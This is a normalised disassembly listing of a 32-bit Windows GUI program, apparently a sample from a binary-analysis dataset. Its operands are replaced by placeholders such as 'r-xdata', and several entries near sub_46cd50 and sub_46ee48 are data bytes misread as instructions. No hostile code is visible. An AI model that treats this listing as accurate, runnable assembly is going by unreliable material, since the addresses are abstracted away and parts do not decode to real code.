mov eax [ eax + 0x4 ]
call sub_462cd0
sub_462778
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_462cd0
sub_462790
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_462cd0
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_4627bc
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_4627c8
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_462cd0
retn
sub_462aa8
push ebx
mov ebx edx
mov edx ebx
call sub_44d62c
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_462b18
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_462c40
jmp sub_4039a8
sub_462c47
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462c50
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_46205c
mov eax [ ebx + 0x20c ]
call sub_46205c
sub_462cb0
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_462cc0
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_462dbb
jmp sub_4039a8
sub_462dc8
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_462de0
sub_462ffc
retn
sub_46306a
jmp sub_4039a8
sub_4630a9
jmp sub_4039a8
sub_4630dc
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44eb24
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_4622e8
retn
sub_463100
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_44eb44
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_4622e8
retn
sub_4631f5
jmp sub_4039a8
sub_4631fc
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_461f50
mov eax [ ebp - 0x4 ]
call sub_462cd0
sub_4632d4
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_44dd40
sub_4632e8
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_463428
jmp sub_4039a8
sub_463460
jmp sub_4039a8
sub_463467
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463487
lea eax [ ebp - 0x114 ]
call sub_403fa4
retn
sub_463480
jmp sub_4039a8
sub_463487
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_46378e
jmp sub_4039a8
sub_463795
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035c8
j_sub_4036f4#9
jmp sub_4036f4
sub_463865
jmp sub_4036f4
sub_46386a
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463c22
jmp sub_4039a8
sub_463c29
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463d04
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41e3a4
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_463d1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_463d54
mov edx eax
mov eax esi
call sub_41fc2c
pop esi
pop ebx
retn
sub_463d38
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4650f8
mov edx eax
mov eax esi
call sub_41fc2c
pop esi
pop ebx
retn
sub_463d54
push ebx
mov ebx eax
mov eax ebx
call sub_464d98
mov edx r-xdata
call sub_4243f0
pop ebx
retn
sub_463e58
push ebx
mov ebx eax
mov eax ebx
call sub_463e68
xor al 0x1
pop ebx
retn
sub_463e68
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_463ec4
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_463ee4
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_463f04
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_4641fd
jmp sub_4039a8
sub_464204
pop ecx
pop ebp
retn
sub_464208
xor eax eax
retn
sub_4644e0
jmp sub_4039a8
sub_4644e7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_4644fd
jmp sub_4039a8
sub_4645e7
jmp sub_4039a8
sub_4645ee
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46460b
mov eax [ ebp - 0xc ]
call sub_403254
retn
sub_464604
jmp sub_4039a8
sub_46462b
jmp sub_4039a8
sub_464916
jmp sub_4039a8
sub_464aa9
jmp sub_4039a8
sub_464d98
mov eax [ eax + 0x238 ]
retn
sub_464da0
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_464dac
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_4650ea
jmp sub_4039a8
sub_4650f1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4650f8
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_465140
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_44dd40
sub_46515c
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_465198
push ebx
mov ebx eax
mov eax ebx
call sub_44fcd4
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_423c94
sub_46521c
push ebx
mov ebx eax
mov eax ebx
call sub_44fcfc
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_424494
sub_46523c
push ebx
mov ebx eax
mov eax ebx
call sub_464e5c
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_464f24
pop ebx
retn
sub_465a69
lea eax [ ebp - 0xb4 ]
call sub_403fa4
retn
sub_465a75
jmp sub_4039a8
j_sub_465a69
jmp sub_465a69
sub_465a7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465bd4
jmp sub_4039a8
sub_465bdb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465ec0
jmp sub_4039a8
sub_465ec7
mov eax [ rw-data ]
call sub_468778
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465ede
add [ eax ] al
retn
sub_46613c
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_46615c
mov eax [ eax + 0x240 ]
call sub_42a88c
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_46a518
sub_466203
jmp sub_4039a8
sub_46620a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46622d
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_42446c
retn
sub_466226
jmp sub_4039a8
sub_46622d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4663ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46615c
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_466654
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_45d804
sub_46673f
jmp sub_4039a8
sub_466746
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46674c
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_465f34
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_4667a4
call sub_4674cc
retn
sub_466bf1
jmp sub_4039a8
sub_466bf8
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4036f4#8
jmp sub_4036f4
sub_467290
jmp sub_4036f4
sub_467389
jmp sub_4039a8
sub_467390
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4673ad
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
sub_4673a6
jmp sub_4039a8
sub_4673ad
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4673b4
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_42a88c
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_463dfc
sub_4673d4
call sub_403254
retn
sub_46742c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_467492
jmp sub_4039a8
j_sub_4036f4#7
jmp sub_4036f4
sub_46766c
xor edx edx
call sub_464160
retn
sub_467674
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_464160
mov eax ebx
call sub_44a218
pop ebx
retn
sub_4676fa
jmp sub_4039a8
sub_467701
pop ebx
pop ecx
pop ebp
retn
sub_467708
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4507d8
push eax
call PostMessageA
pop ebx
retn
sub_46790c
jmp sub_4039a8
sub_4679ad
jmp sub_4039a8
sub_4679b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4679d6
mov eax [ rw-data ]
call sub_469bf0
retn
sub_4679cf
jmp sub_4039a8
sub_4679d6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4679f3
lea eax [ ebp - 0x20 ]
call sub_403fa4
retn
sub_4679ec
jmp sub_4039a8
sub_4679f3
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467ad4
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_4493c4
retn
mov edx eax
mov eax [ rw-data ]
call sub_469244
retn
sub_467e58
mov edx eax
mov eax [ rw-data ]
call sub_46ad0c
mov al 0x1
retn
sub_467f40
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_467e68
sub_467f54
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_467e68
sub_467f68
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_467e68
sub_467f7c
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_467e68
sub_467f90
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_4680fb
jmp sub_4039a8
sub_468102
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468108
push ebx
mov ebx eax
mov eax ebx
call sub_44f0b8
mov eax ebx
call sub_44f23c
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_467708
sub_46837e
jmp sub_4039a8
sub_468385
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46838c
push ebx
mov ebx edx
mov edx ebx
call sub_44f520
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_4494cc
pop ebx
retn
sub_4683e0
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_468448
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4683f8
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_468448
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_468414
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_468448
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_46842c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_468448
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_4686c8
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4686d4
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4686e0
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4686ec
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_4686f8
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_468704
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_468710
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_41a5d0
pop esi
pop ebx
retn
sub_468724
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_468740
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41a5d0
pop esi
pop ebx
retn
sub_468754
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_46875c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_41a5d0
pop esi
pop ebx
retn
sub_468770
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_46884c
mov eax [ eax + 0x54 ]
call sub_41a474
retn
sub_468858
mov eax [ eax + 0x54 ]
call sub_41a714
retn
sub_468aab
jmp sub_4039a8
sub_468aef
jmp sub_4039a8
sub_468af6
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_468b44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468944
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_403ff8
pop esi
pop ebx
retn
sub_468bb0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_41a5d0
pop esi
pop ebx
retn
sub_468bc4
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_468dc9
jmp sub_4039a8
sub_468dd0
pop ebx
mov esp ebp
pop ebp
retn
sub_468dd8
inc [ eax + 0x8c ]
retn
sub_468de0
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_468e00
sub_468e00
xor edx edx
call sub_469244
retn
sub_469236
jmp sub_4039a8
sub_4692bd
jmp sub_4039a8
sub_4692cc
add eax 0x30
call sub_40d788
retn
sub_469310
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
j_sub_4036f4#6
jmp sub_4036f4
sub_469366
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_46ad0c
call sub_403a5c
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_469a35
jmp sub_4039a8
sub_469a3c
pop ebx
mov esp ebp
pop ebp
retn
sub_469bc4
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_469bf0
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_469c1c
xor edx edx
call sub_469b14
retn
sub_469c24
mov dl 0x1
call sub_469b14
retn
sub_469c98
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_469cb0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_469d7d
jmp sub_4039a8
sub_469d84
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a4ce
jmp sub_4036f4
sub_46a7ee
jmp sub_4039a8
sub_46a7f5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46aa60
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46a9c8
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
sub_46ab74
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_46abca
jmp sub_4036f4
sub_46acb1
jmp sub_4036f4
sub_46acea
jmp sub_4039a8
sub_46acf1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46acf8
call sub_40d2d8
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_46aef1
jmp sub_4039a8
sub_46aef8
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46afbf
jmp sub_4039a8
sub_46afc6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b19c
jmp sub_4039a8
sub_46b1a3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b204
jmp sub_4039a8
sub_46b20b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46b214
call sub_46afdc
retn
j_sub_4036f4#5
jmp sub_4036f4
sub_46b458
jmp sub_4039a8
sub_46b45f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b58d
jmp sub_4039a8
sub_46b6ec
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_46b9eb
jmp sub_4039a8
sub_46ba1a
jmp sub_4039a8
sub_46bb26
jmp sub_4039a8
sub_46bb2d
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46bebe
jmp sub_4039a8
sub_46bec5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46bf08
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_46c038
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_46c083
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_46c094
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_46c0a4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_46c117
jmp sub_4039a8
sub_46c11e
pop ebp
retn
sub_46c120
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d78
call sub_46c038
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_461bfc
call sub_41a0c4
sub_46c56e
jmp sub_4039a8
sub_46c575
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46c6ed
jmp sub_4039a8
sub_46c6f4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c741
jmp sub_4039a8
sub_46c748
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c959
jmp sub_4039a8
sub_46c960
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46cb32
jmp sub_4039a8
sub_46cb39
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46cb69
jmp sub_4039a8
sub_46cb70
pop ebp
retn
sub_46cb74
sub [ rw-data ] 0x1
retn
sub_46cd50
mov ebx 0x7cffbaff
iretd
sub_46cd56
inc esi
add [ eax - 0x7ffb931 ] bl
iretd
sub_46cf7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44b63c
movsx eax [ esi + 0x8 ]
mov [ ebx + 0x234 ] eax
pop esi
pop ebx
retn
sub_46cff8
push ebx
mov ebx eax
mov eax ebx
call sub_44eed4
mov eax ebx
call sub_46d398
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46d828
sub_46d074
jmp sub_4039a8
sub_46d07b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d0d4
jmp sub_4039a8
sub_46d0db
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46d168
jmp sub_4039a8
sub_46d16f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46d26e
jmp sub_4039a8
sub_46d275
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d38a
jmp sub_4039a8
sub_46d391
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d398
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
setne al
pop ebx
retn
sub_46d45d
jmp sub_4039a8
sub_46d464
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d538
mov eax [ eax + 0x208 ]
retn
sub_46d786
jmp sub_4039a8
sub_46d818
jmp sub_4039a8
sub_46d81f
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d868
xor edx edx
call sub_46d178
retn
sub_46d870
mov al 0x1
retn
sub_46da61
jmp sub_4039a8
sub_46da68
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dc4e
jmp sub_4039a8
sub_46dc55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dc94
push ebx
mov ebx eax
mov eax edx
dec eax
mov edx eax
mov eax ebx
call sub_46dcd8
mov edx eax
mov eax ebx
call sub_46d5b8
pop ebx
retn
sub_46dee8
jmp sub_4039a8
sub_46deef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46df7b
jmp sub_4039a8
sub_46df82
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e009
jmp sub_4039a8
sub_46e010
pop ebx
mov esp ebp
pop ebp
retn
sub_46e116
jmp sub_4039a8
sub_46e11d
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e36e
jmp sub_4039a8
sub_46e375
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e418
mov edx [ rw-data ]
cmp [ edx + 0x4 ] 0x11
jne r-xdata
xor eax eax
retn
add al 0x5f
sub al 0x3f
jb r-xdata
mov al 0x1
retn
sub_46e4fe
jmp sub_4039a8
sub_46e505
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46e7c2
jmp sub_4039a8
sub_46e7c9
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46ebdc
jmp sub_4039a8
sub_46ebe3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46ec71
jmp sub_4039a8
sub_46ec78
pop ebp
retn
sub_46ec7c
sub [ rw-data ] 0x1
retn
sub_46ee48
mov esp 0xbbffbaff
[ eax + ecx ]
sub_46f257
[ edi - 0x52005101 ]
sub_46f25d
[ edi + edi * 8 - 0x550055 ]
sub_46f264
test eax 0xa7ffa8ff
jmp [ esi - 0x5b005a01 ]
sub_470388
cmp eax [ ecx ]
jl r-xdata
xor eax eax
retn
cmp eax [ ecx + 0x8 ]
jg r-xdata
cmp edx [ ecx + 0x4 ]
jl r-xdata
cmp edx [ ecx + 0xc ]
jle r-xdata
mov al 0x1
retn
sub_4706f3
jmp sub_4039a8
sub_4706fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_470814
push ebx
mov ebx edx
mov edx ebx
call sub_4409cc
or [ ebx + 0x4 ] 0x4
pop ebx
retn
sub_470824
mov [ eax + 0x240 ] edx
retn
sub_47082c
retn
sub_4708b8
push esi
mov eax [ eax + 0x240 ]
mov si 0xffe9
call sub_403450
pop esi
retn
sub_470900
push esi
mov eax [ eax + 0x240 ]
mov si 0xffb0
call sub_403450
pop esi
retn
sub_470dd8
push esi
push ecx
mov [ esp ] cl
mov cl [ esp ]
mov eax [ eax + 0x240 ]
mov si 0xffbb
call sub_403450
pop edx
pop esi
retn
sub_470e6c
push ebx
mov ebx eax
push 0xffffffff
push 0x7fffffff
push 0xb1
mov eax ebx
call sub_4507d8
push eax
call SendMessageA
pop ebx
retn
sub_471080
xor ecx ecx
call sub_470f78
retn
sub_471088
mov cl 0x1
call sub_470f78
retn
sub_47113c
jmp sub_4039a8
sub_471143
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4713fc
jmp sub_4039a8
sub_471403
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4715a8
push ebx
mov ebx eax
mov eax ebx
call sub_44f0dc
test [ ebx + 0x249 ] 0x20
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4716d4
sub_4715e8
mov al 0x1
retn
sub_4715ec
mov al 0x1
retn
sub_4715f0
mov al [ eax + 0x219 ]
retn
sub_4716a4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403fa4
pop ebp
retn 0x4
sub_4716b4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_403fa4
pop ebp
retn 0x4
sub_4716c4
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_4716cc
xor eax eax
retn
sub_4716d0
xor eax eax
retn
sub_4716d4
mov [ eax + 0x28d ] 0x0
call sub_475d78
retn
sub_4716e4
mov [ eax + 0x28d ] 0x1
call sub_475e54
retn
sub_47172c
mov [ eax + 0x280 ] 0xffffffff
mov [ eax + 0x284 ] 0xffffffff
call sub_475e54
retn
sub_471a48
retn
sub_471ad0
retn
sub_471ad4
mov al 0x1
retn
sub_471ad8
retn
sub_471b74
xchg ecx edx
push edi
mov edi eax
mov eax edx
[ edi ]
pop edi
retn
j_sub_4036f4#4
jmp sub_4036f4
sub_4732bd
jmp sub_4039a8
sub_4732c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4732e1
mov eax [ ebp - 0x4 ]
call sub_403254
retn
sub_4732da
jmp sub_4039a8
sub_4732e1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47344c
jmp sub_4039a8
sub_473453
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473470
mov eax [ ebp - 0x8 ]
call sub_403254
retn
sub_473469
jmp sub_4039a8
sub_473470
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_473750
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_473f65
jmp sub_4039a8
sub_473f6c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473fcc
push ebp
mov ebp esp
call sub_473750
pop ebp
retn 0x4
sub_473fd8
push ebp
mov ebp esp
call sub_473750
pop ebp
retn 0x4
sub_47486e
jmp sub_4039a8
sub_4748a8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4707b4
retn
j_sub_4036f4#3
jmp sub_4036f4
sub_47523c
cmp [ ebp - 0x11 ] 0x0
je r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_4732e8
sub_47569f
jmp sub_4039a8
sub_4756a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_475828
mov ecx [ eax + 0x220 ]
test ecx ecx
je r-xdata
